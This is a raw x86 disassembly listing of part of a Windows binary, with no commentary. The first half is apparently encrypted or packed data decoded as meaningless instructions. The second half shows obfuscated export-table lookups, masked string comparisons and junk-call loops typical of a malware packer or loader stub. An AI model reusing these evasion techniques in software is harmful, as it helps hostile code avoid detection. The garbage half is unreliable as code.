  40fe6d:	or     edi,DWORD PTR es:[ebp+ebp*1-0xf5b575d]
  40fe75:	cmp    al,0x9d
  40fe77:	aad    0x70
  40fe79:	and    BYTE PTR [ebx+esi*2],cl
  40fe7c:	xor    DWORD PTR [edx-0x37e3d057],ebp
  40fe82:	shl    BYTE PTR [ebp-0x334b0d5c],0x80
  40fe89:	fcmovb st,st(2)
  40fe8b:	and    ch,BYTE PTR [ecx]
  40fe8d:	push   ebx
  40fe8e:	lahf   
  40fe8f:	stos   BYTE PTR es:[edi],al
  40fe90:	addr16 mov ah,0x19
  40fe94:	mov    ds:0xcae5a3ca,al
  40fe99:	and    BYTE PTR [ecx+0x43],bl
  40fe9c:	pop    ebx
  40fe9d:	gs add eax,ebp
  40fea0:	push   eax
  40fea1:	cs cld 
  40fea3:	dec    esp
  40fea4:	aam    0xaf
  40fea6:	jp     0x40fe68
  40fea8:	jge    0x40ff0d
  40feaa:	loope  0x40fe4a
  40feac:	(bad)  [eax-0x76]
  40feaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40feb0:	sub    BYTE PTR [edi+edi*8],ah
  40feb3:	jo     0x40ff09
  40feb5:	mov    cl,0x3d
  40feb7:	(bad)  [edi+0x312f5b28]
  40febd:	push   0x214b7e75
  40fec2:	ret    
  40fec3:	push   esp
  40fec4:	test   ebp,ebx
  40fec6:	call   FWORD PTR [ecx+0x511114a0]
  40fecc:	xor    al,0x6b
  40fece:	cmp    eax,0xf79e67bb
  40fed3:	mov    bl,BYTE PTR [edi]
  40fed5:	js     0x40fecb
  40fed7:	lock jns 0x40fef3
  40feda:	mov    edi,0xc3422500
  40fedf:	push   edx
  40fee0:	push   esi
  40fee1:	ds aam 0x8b
  40fee4:	fcomp  QWORD PTR [ebp-0x1d]
  40fee7:	cmp    esp,DWORD PTR ds:0xbb44412f
  40feed:	xchg   dh,ah
  40feef:	ja     0x40ff04
  40fef1:	or     BYTE PTR [eax+0x225b59cb],0xae
  40fef8:	ins    DWORD PTR es:[edi],dx
  40fef9:	cmp    al,0xf7
  40fefb:	fldcw  WORD PTR [ecx-0x20]
  40fefe:	sub    BYTE PTR [edi+0xf],cl
  40ff01:	and    eax,0x643d0a57
  40ff06:	fild   QWORD PTR [ebx+0x8]
  40ff09:	mov    ch,0x9c
  40ff0b:	std    
  40ff0c:	push   esi
  40ff0d:	dec    esp
  40ff0e:	(bad)  
  40ff0f:	outs   dx,BYTE PTR ds:[esi]
  40ff10:	add    ebp,DWORD PTR [edx+0x26ad83f2]
  40ff16:	push   edx
  40ff17:	inc    edi
  40ff18:	scas   al,BYTE PTR es:[edi]
  40ff19:	dec    ebp
  40ff1a:	loopne 0x40fecf
  40ff1c:	fst    DWORD PTR [edi-0x51]
  40ff1f:	rol    bh,cl
  40ff21:	push   ds
  40ff22:	call   0x9b7c5891
  40ff27:	xor    DWORD PTR [edx],eax
  40ff29:	out    dx,al
  40ff2a:	test   ah,cl
  40ff2c:	fsub   st,st(6)
  40ff2e:	adc    ebp,DWORD PTR [esi+eiz*8-0x1753c391]
  40ff35:	aas    
  40ff36:	imul   ebp,DWORD PTR [ebx],0x8ed060b5
  40ff3c:	adc    eax,0xbc85840c
  40ff41:	test   eax,0xc9603759
  40ff46:	jge    0x40ff95
  40ff48:	lods   eax,DWORD PTR ds:[esi]
  40ff49:	lahf   
  40ff4a:	lods   al,BYTE PTR ds:[esi]
  40ff4b:	mov    bh,0xce
  40ff4d:	add    BYTE PTR ds:0x52d49be2,ah
  40ff53:	jo     0x40ff71
  40ff55:	fwait
  40ff56:	test   al,0x0
  40ff58:	mov    dl,0xc3
  40ff5a:	in     al,0x85
  40ff5c:	sub    ch,BYTE PTR [edi+edi*4-0x21]
  40ff60:	add    edx,DWORD PTR [esi+0x15]
  40ff63:	bound  ebp,QWORD PTR [esi+0x21]
  40ff66:	call   0x7820f96c
  40ff6b:	out    dx,al
  40ff6c:	icebp  
  40ff6d:	sti    
  40ff6e:	fnstsw WORD PTR [esi-0x72]
  40ff71:	nop
  40ff72:	int3   
  40ff73:	gs inc esi
  40ff75:	cs pop ss
  40ff77:	push   esi
  40ff78:	stos   BYTE PTR es:[edi],al
  40ff79:	out    dx,al
  40ff7a:	pop    esi
  40ff7b:	aaa    
  40ff7c:	or     dh,BYTE PTR [esp+ecx*2-0x466be1df]
  40ff83:	inc    edi
  40ff84:	mov    eax,ds:0x4b31e837
  40ff89:	inc    ebp
  40ff8a:	xchg   ch,al
  40ff8c:	ret    
  40ff8d:	ins    BYTE PTR es:[edi],dx
  40ff8e:	adc    al,0xf5
  40ff90:	loope  0x40ffcd
  40ff92:	test   ecx,ebp
  40ff94:	sub    dl,BYTE PTR [esi+0x575e9036]
  40ff9a:	mov    DWORD PTR [esi-0x472a8f74],ebp
  40ffa0:	mov    eax,0x9984bcb3
  40ffa5:	xlat   BYTE PTR ds:[ebx]
  40ffa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffa7:	shl    BYTE PTR [esi],1
  40ffa9:	sbb    eax,0xbefcf1f9
  40ffae:	into   
  40ffaf:	mov    bl,0xd7
  40ffb1:	imul   edi,ebp,0x1b380e48
  40ffb7:	lds    edi,FWORD PTR [eax+0x49]
  40ffba:	shl    edi,cl
  40ffbc:	pop    eax
  40ffbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffbe:	pop    ax
  40ffc0:	push   0x60
  40ffc2:	(bad)  
  40ffc3:	lods   al,BYTE PTR ds:[esi]
  40ffc4:	pop    ecx
  40ffc5:	or     bh,al
  40ffc7:	popa   
  40ffc8:	pop    eax
  40ffc9:	(bad)  
  40ffca:	or     eax,0x6357327
  40ffcf:	or     eax,0xb79d3554
  40ffd4:	pop    es
  40ffd5:	lahf   
  40ffd6:	jno    0x40ffb5
  40ffd8:	mov    ebp,0xbd8ba5d7
  40ffdd:	stos   DWORD PTR es:[edi],eax
  40ffde:	dec    eax
  40ffdf:	sbb    al,0x20
  40ffe1:	sbb    bl,BYTE PTR [ebp-0x59a01e62]
  40ffe7:	in     eax,0x21
  40ffe9:	data16 loopne 0x40ff84
  40ffec:	xchg   edi,eax
  40ffed:	fisttp DWORD PTR [ecx-0x43]
  40fff0:	dec    ecx
  40fff1:	or     eax,DWORD PTR [edx]
  40fff3:	adc    al,0x81
  40fff5:	dec    esp
  40fff6:	adc    esp,DWORD PTR cs:[eax+0x58]
  40fffa:	sbb    eax,0x86d2f008
  40ffff:	push   0x15ce82c4
  410004:	je     0x41000e
  410006:	or     eax,0x1a2da989
  41000b:	sbb    eax,edi
  41000d:	pop    ebp
  41000e:	and    dh,BYTE PTR [ecx+0x6464e7a5]
  410014:	es es mov bl,0x11
  410018:	fisub  DWORD PTR [ecx-0x26fc5a4]
  41001e:	xchg   esp,eax
  41001f:	or     esp,edx
  410021:	pop    edi
  410022:	inc    eax
  410023:	sbb    DWORD PTR [ecx+0x1a],0xffffffd0
  410027:	xor    eax,0x55ba8a84
  41002c:	jnp    0x41002f
  41002e:	sub    BYTE PTR [esi-0x76],0x19
  410032:	mov    cs,WORD PTR [ebx-0x259ff9e8]
  410038:	mov    bh,0xa7
  41003a:	bound  eax,QWORD PTR [ecx+0x71e009d9]
  410040:	dec    ebp
  410041:	sub    al,BYTE PTR [ebx]
  410043:	out    0x37,al
  410045:	shr    BYTE PTR [ecx-0x5c9eeceb],0xd3
  41004c:	mov    cl,0x35
  41004e:	push   edx
  41004f:	dec    edi
  410051:	adc    eax,0xd0abee9
  410056:	fs xchg ebp,eax
  410058:	and    DWORD PTR [ebp-0x1df38d33],ecx
  41005e:	sbb    BYTE PTR [eax],ch
  410060:	cmp    eax,0x328682ec
  410065:	sub    bl,al
  410067:	jns    0x410087
  410069:	call   0x6f04:0x162e5b51
  410070:	(bad)  [ebx+0x48]
  410073:	cli    
  410074:	rcl    BYTE PTR [eax],cl
  410076:	inc    ebx
  410077:	cdq    
  410078:	retf   
  410079:	lahf   
  41007a:	jae    0x41004c
  41007c:	pusha  
  41007d:	dec    esp
  41007e:	jae    0x41006b
  410080:	and    eax,0x9b8b50a3
  410085:	loop   0x410033
  410087:	xchg   edx,eax
  410088:	test   bh,dl
  41008a:	ficom  WORD PTR [ecx-0xc4a11b8]
  410090:	jp     0x41008d
  410092:	imul   ebp,DWORD PTR [ecx-0x18447e78],0xfffffff0
  410099:	pop    dx
  41009b:	repz dec ebx
  41009d:	out    0x87,eax
  41009f:	imul   edx,DWORD PTR [ebp+0x6c],0xbf4a3c06
  4100a6:	sbb    DWORD PTR [eax],eax
  4100a8:	retf   0xf601
  4100ab:	inc    eax
  4100ac:	mov    al,cs:0x5052b3fc
  4100b2:	mov    BYTE PTR [ebp-0x6373a568],al
  4100b8:	iret   
  4100b9:	bound  ebx,QWORD PTR [esi-0x53637f3a]
  4100bf:	iret   
  4100c0:	test   BYTE PTR [edx+0x46],ah
  4100c3:	and    eax,0x4d97b1f7
  4100c8:	push   edx
  4100c9:	fidivr DWORD PTR [edi-0x68]
  4100cc:	jge    0x410085
  4100ce:	jae    0x41009b
  4100d0:	cdq    
  4100d1:	sbb    BYTE PTR [edi+0x36],dh
  4100d4:	aam    0x9b
  4100d6:	fiadd  WORD PTR [eax-0x753f3a92]
  4100dc:	stos   BYTE PTR es:[edi],al
  4100dd:	cmp    BYTE PTR [edi+0x28c7a859],al
  4100e3:	fsubr  DWORD PTR [ebx-0x7961f155]
  4100e9:	fild   WORD PTR [edx+0x2b4cb2e4]
  4100ef:	loopne 0x41009c
  4100f1:	dec    esp
  4100f2:	cli    
  4100f3:	jge    0x41015a
  4100f5:	std    
  4100f6:	(bad)  
  4100f7:	pop    esi
  4100f8:	add    al,0xfd
  4100fa:	xor    ebx,DWORD PTR ds:0xbfe073b3
  410100:	dec    ebp
  410101:	push   ecx
  410102:	lea    edi,[edi+eiz*4+0x1fc34e48]
  410109:	shl    al,0xcc
  41010c:	or     dl,BYTE PTR [edi]
  41010e:	bound  eax,QWORD PTR [ecx-0x7a045cd]
  410114:	cmp    al,0x85
  410116:	jmp    0x4100f6
  410118:	leave  
  410119:	sti    
  41011a:	push   es
  41011b:	loope  0x4100ef
  41011d:	xor    al,0x3f
  41011f:	push   edx
  410120:	gs enter 0xa1d3,0x14
  410125:	inc    edx
  410126:	pop    ebx
  410127:	push   ss
  410128:	nop
  410129:	sbb    al,0x7
  41012b:	(bad)  
  41012d:	sub    al,0x7d
  41012f:	sbb    ebx,DWORD PTR [esi]
  410131:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410132:	jno    0x410144
  410134:	jp     0x4100c7
  410136:	push   ebp
  410137:	shl    ah,cl
  410139:	dec    edx
  41013a:	mov    ecx,0x8092efda
  41013f:	rcl    dl,0x3d
  410142:	mov    ds:0x856b7d72,eax
  410147:	sbb    eax,edi
  410149:	sbb    DWORD PTR ds:0xb1212f84,0x81009545
  410153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410154:	fdiv   QWORD PTR [eax-0x1c]
  410157:	fidivr DWORD PTR [eax+0x12]
  41015a:	mov    ebp,0x8ddbccd7
  41015f:	mov    dh,0x12
  410161:	call   0x461b2083
  410166:	pop    esp
  410167:	add    BYTE PTR [edi],ah
  410169:	and    ebp,DWORD PTR [eax+0x22]
  41016c:	mov    bh,BYTE PTR [ebx-0x46477d21]
  410172:	mov    dl,0x25
  410174:	xor    al,0xef
  410176:	cmp    DWORD PTR [edi-0x56],ecx
  410179:	leave  
  41017a:	mov    esp,0x26934b06
  41017f:	sbb    dh,BYTE PTR [edi+0x192f536f]
  410185:	jnp    0x410183
  410187:	mov    cl,0x93
  410189:	mov    ds:0x1159e1d7,eax
  41018e:	jbe    0x4101da
  410190:	push   ebx
  410191:	mov    ebx,0x769f1f75
  410196:	mov    ecx,0xea4988ae
  41019b:	aad    0x4b
  41019d:	dec    esp
  41019e:	mov    esi,0xbc8da7e
  4101a3:	jmp    0xc7ecd77f
  4101a8:	push   es
  4101a9:	div    BYTE PTR [ecx]
  4101ab:	repnz daa 
  4101ad:	xchg   ebp,eax
  4101ae:	iret   
  4101af:	in     al,0xb0
  4101b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101b2:	es jmp 0xc9c2:0x8e0cc48a
  4101ba:	stos   BYTE PTR es:[edi],al
  4101bb:	imul   edi,ebx,0xffffff98
  4101be:	dec    edi
  4101bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101c0:	add    DWORD PTR [edx],0x31
  4101c3:	enter  0x3455,0xc0
  4101c7:	hlt    
  4101c8:	stos   BYTE PTR es:[edi],al
  4101c9:	jb     0x41019e
  4101cb:	mov    DWORD PTR [esi+0x71497146],edx
  4101d1:	fcomi  st,st(6)
  4101d3:	jp     0x410248
  4101d5:	pusha  
  4101d6:	mov    gs,WORD PTR [edi+esi*2-0x1a]
  4101da:	in     eax,0xd
  4101dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4101dd:	nop
  4101de:	lahf   
  4101df:	xor    BYTE PTR [eax],al
  4101e1:	jmp    0x410172
  4101e3:	mov    ebx,0x5e9e908f
  4101e8:	push   es
  4101e9:	add    BYTE PTR [esi],bl
  4101eb:	xchg   edi,eax
  4101ec:	add    al,0xb1
  4101ee:	sub    BYTE PTR [edx],0x7f
  4101f1:	push   ebx
  4101f2:	mov    bh,0x79
  4101f4:	push   0xe61a7c5
  4101f9:	cmp    edx,DWORD PTR [edx+0x55]
  4101fc:	jp     0x41019f
  4101fe:	test   al,0xfe
  410200:	sahf   
  410201:	das    
  410202:	jmp    0x81b98d69
  410207:	mov    bl,0xc5
  410209:	cmp    BYTE PTR [edx+0x45],bl
  41020c:	or     eax,0x902ef3e2
  410211:	add    al,0x5f
  410213:	in     al,0x6b
  410215:	cs leave 
  410217:	aad    0xc4
  410219:	dec    eax
  41021a:	mov    al,ds:0x7961e91a
  41021f:	mov    dl,0x7c
  410221:	sti    
  410222:	mov    bh,ch
  410224:	push   es
  410225:	rcr    DWORD PTR [edx],0x91
  410228:	fidiv  WORD PTR [ecx]
  41022a:	pop    ss
  41022b:	mov    edx,0x183a3e5c
  410230:	cli    
  410231:	or     eax,0x54d0f080
  410236:	sbb    esp,ebp
  410238:	sub    bl,ah
  41023a:	adc    al,0x74
  41023c:	pop    esp
  41023d:	lods   al,BYTE PTR ds:[esi]
  41023e:	jmp    0xd976a0ce
  410243:	push   esp
  410244:	rcr    DWORD PTR [esi-0x7],0x80
  410248:	lock rol ch,0x36
  41024c:	les    esi,FWORD PTR [eax-0x7f]
  41024f:	and    bh,BYTE PTR [ecx+eax*1]
  410252:	(bad)  
  410253:	adc    eax,DWORD PTR [edi-0x3f628765]
  410259:	test   DWORD PTR [edx],0xb5bc0372
  41025f:	inc    edx
  410260:	xor    edi,DWORD PTR [ebp+0x1cdba8b6]
  410266:	aas    
  410267:	dec    ebx
  410268:	ror    BYTE PTR [edi+0x1e348202],1
  41026e:	mov    dl,BYTE PTR [ebx]
  410270:	and    bh,dl
  410272:	arpl   WORD PTR [ebx],bx
  410274:	xor    BYTE PTR [eax],0x7c
  410277:	mov    ss,WORD PTR [edx]
  410279:	pop    esi
  41027a:	test   eax,0x5c2e8114
  41027f:	outs   dx,DWORD PTR ds:[esi]
  410280:	or     al,bh
  410282:	mov    bl,0x43
  410284:	push   cs
  410285:	pop    edx
  410286:	push   edx
  410287:	(bad)  
  410288:	nop
  410289:	in     eax,0xf0
  41028b:	dec    ecx
  41028c:	arpl   WORD PTR [edi+0x2f4be901],bx
  410292:	ret    0x167b
  410295:	sbb    DWORD PTR [ecx-0x1d],edi
  410298:	std    
  410299:	std    
  41029a:	xor    al,0x6f
  41029c:	sub    edi,DWORD PTR [edi-0x15ec7bba]
  4102a2:	cmp    al,0xe3
  4102a4:	dec    esi
  4102a5:	sub    eax,0x6e7c3b3e
  4102aa:	addr16 push 0xb3cf3cab
  4102b0:	mov    ah,0x83
  4102b2:	cld    
  4102b3:	fiadd  DWORD PTR [ebx+0x75f4ab4c]
  4102b9:	pop    edx
  4102ba:	inc    esi
  4102bb:	(bad)  
  4102bc:	es loop 0x410321
  4102bf:	rcl    BYTE PTR [eax-0x1c66a402],cl
  4102c5:	pop    edi
  4102c6:	(bad)  
  4102c7:	mov    ebp,0x60670117
  4102cc:	jmp    0x410251
  4102ce:	jae    0x410257
  4102d0:	mov    ebp,0xc697b8c6
  4102d5:	cwde   
  4102d6:	pop    ecx
  4102d7:	mov    ?,WORD PTR [esi]
  4102d9:	test   eax,0x61f5e40a
  4102de:	repz bound edi,QWORD PTR [eax+0x6d385592]
  4102e5:	add    al,0x49
  4102e7:	fldenv [edi+0x48295e04]
  4102ed:	sbb    al,0x83
  4102ef:	les    esp,FWORD PTR [edi+0x63]
  4102f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102f3:	xchg   DWORD PTR ds:0xcecffb24,ebx
  4102f9:	(bad)  
  4102fb:	jp     0x4102b9
  4102fd:	mov    bl,0xb
  4102ff:	in     al,0xed
  410301:	push   edi
  410302:	inc    ebp
  410303:	mov    ah,0xaf
  410305:	jo     0x41032f
  410307:	mov    ds:0x6a6af405,eax
  41030c:	repz fsub st,st(6)
  41030f:	xchg   edi,eax
  410310:	dec    esi
  410311:	out    0x1,eax
  410313:	pop    ecx
  410314:	int    0x57
  410316:	out    0x6b,al
  410318:	push   es
  410319:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41031a:	xor    esp,DWORD PTR [edx+0x72]
  41031d:	mov    cl,0xcb
  41031f:	dec    ebx
  410320:	enter  0x4068,0xe7
  410324:	add    BYTE PTR [ebx-0x61],dl
  410327:	repz push esp
  410329:	cmp    esi,DWORD PTR [ebp+0x37]
  41032c:	mov    BYTE PTR [ecx-0x3f],ch
  41032f:	shl    eax,0xff
  410332:	test   eax,0x9f4322e4
  410337:	fsub   QWORD PTR [ecx+ebx*4+0x71]
  41033b:	sbb    edi,DWORD PTR [esi+ecx*8]
  41033e:	push   eax
  41033f:	xchg   edx,eax
  410340:	cmp    dl,0x7f
  410343:	enter  0x63c8,0x4b
  410347:	pop    esp
  410348:	jge    0x4102eb
  41034a:	mov    ebx,0xd3afe84f
  41034f:	adc    dl,0xcb
  410352:	loopne 0x4102e6
  410354:	aad    0x23
  410356:	xchg   ebx,eax
  410357:	add    DWORD PTR [eax+0x52],ebp
  41035a:	shl    cl,0xa7
  41035d:	mov    cl,0xa8
  41035f:	sbb    bh,BYTE PTR [edi+esi*8]
  410362:	mov    esi,?
  410364:	pop    edi
  410365:	and    DWORD PTR [edi+edi*2+0x4e3650f6],ecx
  41036c:	sbb    al,0xbb
  41036e:	dec    ebx
  41036f:	cmp    eax,DWORD PTR [eax]
  410371:	add    BYTE PTR [esi+0x2b],ah
  410374:	sti    
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d3dc
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff82
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d4f0
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d3dc
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
